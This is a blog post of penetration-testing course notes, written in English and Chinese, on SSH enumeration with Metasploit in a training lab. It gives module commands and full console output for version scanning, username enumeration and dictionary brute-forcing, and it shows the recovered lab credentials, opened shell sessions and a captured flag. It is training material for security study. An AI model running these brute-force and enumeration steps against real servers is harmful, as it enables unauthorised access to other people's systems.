---
layout: post
title: "SSH Enumeration"
date: "2022-12-13"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# SSH Enumeration
SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.

It is typically used for remote access to servers and systems.

SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.

We can utilize auxiliary modules to enumerate the version of SSH running on the target as well as perform brute-force attacks to identify passwords that can consequently provide us remote access to a target.

# SSH 枚举
SSH（安全外壳）是一种提供加密的远程管理协议，是 Telnet 的后继者。

Whenever you want to connect to a remote server, it could be hosted on a cloud platform, or it just could be offsite. The protocol of choice is SSH. And if you want to access the target remotely via a graphical user interface, you'd typically use a protocol like RDP or VNC. However, when we're talking about SSH and it's advantages over Telnet, one of the key advantages is that it offers encryption and essentially encrypts the communication channel between the client and the server. So if I was using Telnet, then I would typically initiate a connection between myself and the target, provide the credentials. However, the communication channel would be unencrypted, which means that any attacker could perform a "man in the middle" attack and sniff the traffic and consequently get information regarding what commands I'm sending over. And these commands could be potentially important or useful. So this is where SSH comes into play. It essentially encrypts the channel, the communication channel, between the client and the server. And that prevents "man in the middle" attacks.

SSH authentication is performed two ways. You can either utilize a clear-text password or what we've started seeing now is a SSH key-based authentication, where authentication is handled in the form of a public and private key pair. 

它通常用于远程访问服务器和系统。

SSH 默认使用 TCP 端口 22，但是，与其他服务一样，它可以配置为使用任何其他开放的 TCP 端口。

If you perform a full port scan, you should be able to identify it.

我们可以利用辅助模块来枚举在目标上运行的 SSH 版本，并执行暴力攻击来识别密码，从而为我们提供对目标的远程访问。

The version information is very important during the vulnerability scanning section. So again, if you're a bit confused as to why we're getting the version, all of this will come into context when we start using the version information to find inherent vulnerabilities in the services.

Given that SSH is a remote administration protocol, if we are able to get any credentials, then that means we can establish a direct communication channel with the target and consequently get remote access to the target.

# Demo: SSH Enumeration（演示：SSH 枚举）

```
ifconfig
eth1: 192.30.120.2
```

```
service postgresql start
msfconsole -q
```

Create a workspace.

```
workspace -a SSH_Enum
```

Set up global variables for RHOSTS.

```
setg RHOSTS 192.30.120.3
setg RHOST 192.30.120.3
```

Let's get started with SSH enumeration.

```
search type:auxiliary name:ssh
```

```
use auxiliary/scanner/ssh/ssh_version
show options
run
search openssh
```

If the target has been configured to use a public or a key-pair authentication, then we would use `auxiliary/scanner/ssh/ssh_login_pubkey` module.

In this case, the target is configured to use password authentication, so we'll use the `auxiliary/scanner/ssh/ssh_login` module.

```
use auxiliary/scanner/ssh/ssh_login
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run
```

This module will automatically open up a command shell session here on the target system via SSH. 

```
sessions
sessions 1
/bin/bash -i
ls
whoami
exit
^C
sessions
```

If your initial brute force isn't successful, you can use this module to find usernames and narrow down your brute force.

```
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_enumusers
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

# SSH Login
## Overview
In this lab, run the following auxiliary modules against the target:

auxiliary/scanner/ssh/ssh_version

auxiliary/scanner/ssh/ssh_login

Instructions: 

This lab is dedicated to you! No other users are on this network :)

Once you start the lab, you will have access to a root terminal of a Kali instance

Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.

The target server should be located at the IP address 192.X.Y.3.

Do not attack the gateway located at IP address 192.X.Y.1

Use /usr/share/metasploit-framework/data/wordlists/common_users.txt username dictionary

Use /usr/share/metasploit-framework/data/wordlists/common_passwords.txt password dictionary

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-1526.pdf

## 我自己的思路
[SSH Version Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_version/)

SSH 版本扫描器

检测 SSH 版本。

[SSH Login Check Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/)

SSH 登录检查扫描程序

该模块将在一系列机器上测试 ssh 登录并报告成功登录。如果您加载了数据库插件并连接到数据库，此模块将记录成功的登录和主机，以便您可以跟踪您的访问。

[SSH Username Enumeration](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/)

SSH 用户名枚举

该模块使用格式错误的数据包或定时攻击来枚举 OpenSSH 服务器上的用户。默认操作使用公钥身份验证（必须启用）发送格式错误（损坏）的 SSH_MSG_USERAUTH_REQUEST 数据包以枚举用户。在某些配置下的某些版本的 OpenSSH 上，OpenSSH 将比有效用户更快地为无效用户返回“权限被拒绝”错误，从而为定时攻击枚举用户创造了机会。测试说明：记录了无效用户，而没有记录有效用户。

```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.20.21.2  netmask 255.255.255.0  broadcast 192.20.21.255
        ether 02:42:c0:14:15:02  txqueuelen 0  (Ethernet)
```

```
root@attackdefense:~# service postgresql start
Starting PostgreSQL 12 database server: main.
root@attackdefense:~# msfconsole -q
msf5 > setg RHOSTS 192.20.21.3
RHOSTS => 192.20.21.3
msf5 > setg RHOST 192.20.21.3
RHOST => 192.20.21.3
msf5 > workspace -a SSH_Enum
[*] Added workspace: SSH_Enum
[*] Workspace: SSH_Enum
msf5 > workspace
  default
* SSH_Enum
```

```
msf5 > search type:auxiliary name:ssh

Matching Modules
================

   #   Name                                            Disclosure Date  Rank    Check  Description
   -   ----                                            ---------------  ----    -----  -----------
   0   auxiliary/dos/windows/ssh/sysax_sshd_kexchange  2013-03-17       normal  No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
   1   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                        normal  No     SSH Key Exchange Init Corruption
   2   auxiliary/fuzzers/ssh/ssh_version_15                             normal  No     SSH 1.5 Version Fuzzer
   3   auxiliary/fuzzers/ssh/ssh_version_2                              normal  No     SSH 2.0 Version Fuzzer
   4   auxiliary/fuzzers/ssh/ssh_version_corrupt                        normal  No     SSH Version Corruption
   5   auxiliary/scanner/ssh/detect_kippo                               normal  No     Kippo SSH Honeypot Detector
   6   auxiliary/scanner/ssh/eaton_xpert_backdoor      2018-07-18       normal  No     Eaton Xpert Meter SSH Private Key Exposure Scanner
   7   auxiliary/scanner/ssh/fortinet_backdoor         2016-01-09       normal  No     Fortinet SSH Backdoor Scanner
   8   auxiliary/scanner/ssh/juniper_backdoor          2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   9   auxiliary/scanner/ssh/libssh_auth_bypass        2018-10-16       normal  No     libssh Authentication Bypass Scanner
   10  auxiliary/scanner/ssh/ssh_enum_git_keys                          normal  No     Test SSH Github Access
   11  auxiliary/scanner/ssh/ssh_enumusers                              normal  No     SSH Username Enumeration
   12  auxiliary/scanner/ssh/ssh_identify_pubkeys                       normal  No     SSH Public Key Acceptance Scanner
   13  auxiliary/scanner/ssh/ssh_login                                  normal  No     SSH Login Check Scanner
   14  auxiliary/scanner/ssh/ssh_login_pubkey                           normal  No     SSH Public Key Login Scanner
   15  auxiliary/scanner/ssh/ssh_version                                normal  No     SSH Version Scanner
```

```
msf5 > use auxiliary/scanner/ssh/ssh_version
msf5 auxiliary(scanner/ssh/ssh_version) > run

[+] 192.20.21.3:22        - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.20.21.3:22        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/ssh/ssh_enumusers
msf5 auxiliary(scanner/ssh/ssh_enumusers) > show options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CHECK_FALSE  false            no        Check for false positives (random username)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.20.21.3      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        22               yes       The target port
   THREADS      1                yes       The number of concurrent threads (max one per host)
   THRESHOLD    10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                      no        Single username to test (username spray)
   USER_FILE                     no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet


msf5 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 192.20.21.3:22 - SSH - Using malformed packet technique
[*] 192.20.21.3:22 - SSH - Starting scan
[+] 192.20.21.3:22 - SSH - User 'sysadmin' found
[+] 192.20.21.3:22 - SSH - User 'rooty' found
[+] 192.20.21.3:22 - SSH - User 'demo' found
[+] 192.20.21.3:22 - SSH - User 'auditor' found
[+] 192.20.21.3:22 - SSH - User 'anon' found
[+] 192.20.21.3:22 - SSH - User 'administrator' found
[+] 192.20.21.3:22 - SSH - User 'diag' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/ssh/ssh_enumusers) > pwd
[*] exec: pwd

/root
msf5 auxiliary(scanner/ssh/ssh_enumusers) > vim users.txt
[*] exec: vim users.txt

sysadmin
rooty
demo
auditor
anon
administrator
diag
```

```
msf5 auxiliary(scanner/ssh/ssh_enumusers) > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS            192.20.21.3      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /root/users.txt
USER_FILE => /root/users.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.20.21.3:22 - Success: 'sysadmin:hailey' ''
[*] Command shell session 1 opened (192.20.21.2:41171 -> 192.20.21.3:22) at 2022-12-13 10:08:37 +0000
[+] 192.20.21.3:22 - Success: 'rooty:pineapple' ''
[*] Command shell session 2 opened (192.20.21.2:45393 -> 192.20.21.3:22) at 2022-12-13 10:10:05 +0000
[+] 192.20.21.3:22 - Success: 'demo:butterfly1' ''
[*] Command shell session 3 opened (192.20.21.2:41757 -> 192.20.21.3:22) at 2022-12-13 10:11:37 +0000
[+] 192.20.21.3:22 - Success: 'auditor:xbox360' ''
[*] Command shell session 4 opened (192.20.21.2:46115 -> 192.20.21.3:22) at 2022-12-13 10:13:21 +0000
[+] 192.20.21.3:22 - Success: 'anon:741852963' ''
[*] Command shell session 5 opened (192.20.21.2:33773 -> 192.20.21.3:22) at 2022-12-13 10:15:42 +0000
[+] 192.20.21.3:22 - Success: 'administrator:password1' ''
[*] Command shell session 6 opened (192.20.21.2:40981 -> 192.20.21.3:22) at 2022-12-13 10:17:57 +0000
[+] 192.20.21.3:22 - Success: 'diag:secret' ''
[*] Command shell session 7 opened (192.20.21.2:45293 -> 192.20.21.3:22) at 2022-12-13 10:20:15 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 > vim user_pass.txt
[*] exec: vim user_pass.txt
sysadmin hailey
rooty pineapple
demo butterfly1
auditor xbox360
anon 741852963
administrator password1
diag secret
```

```
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /root/user_pass.txt
USERPASS_FILE => /root/user_pass.txt
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information                                   Connection
  --  ----  ----           -----------                                   ----------
  1         shell unknown  SSH sysadmin:hailey (192.20.21.3:22)          192.20.21.2:37227 -> 192.20.21.3:22 (192.20.21.3)
  2         shell unknown  SSH rooty:pineapple (192.20.21.3:22)          192.20.21.2:38219 -> 192.20.21.3:22 (192.20.21.3)
  3         shell unknown  SSH demo:butterfly1 (192.20.21.3:22)          192.20.21.2:39813 -> 192.20.21.3:22 (192.20.21.3)
  4         shell unknown  SSH auditor:xbox360 (192.20.21.3:22)          192.20.21.2:46771 -> 192.20.21.3:22 (192.20.21.3)
  5         shell unknown  SSH anon:741852963 (192.20.21.3:22)           192.20.21.2:40449 -> 192.20.21.3:22 (192.20.21.3)
  6         shell unknown  SSH administrator:password1 (192.20.21.3:22)  192.20.21.2:36607 -> 192.20.21.3:22 (192.20.21.3)
  7         shell unknown  SSH diag:secret (192.20.21.3:22)              192.20.21.2:45257 -> 192.20.21.3:22 (192.20.21.3)
```

可以与session进行交互：

```
msf5 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

Welcome to Ubuntu 19.04 (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
/bin/bash -i
bash: cannot set terminal process group (683): Inappropriate ioctl for device
bash: no job control in this shell
sysadmin@victim-1:~$ whoami
whoami
sysadmin
sysadmin@victim-1:~$ ls
ls
sysadmin@victim-1:~$ cat /flag
cat /flag
eb09cc6f1cd72756da145892892fbf5a
```

还可以直接使用ssh命令行工具登录：

```
msf5 auxiliary(scanner/ssh/ssh_login) > ssh anon@192.20.21.3
[*] exec: ssh anon@192.20.21.3

anon@192.20.21.3's password: 
Welcome to Ubuntu 19.04 (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
anon@victim-1:~$ whoami
anon
anon@victim-1:~$ find / -name flag*
/flag
anon@victim-1:~$ cat /flag
eb09cc6f1cd72756da145892892fbf5a
```
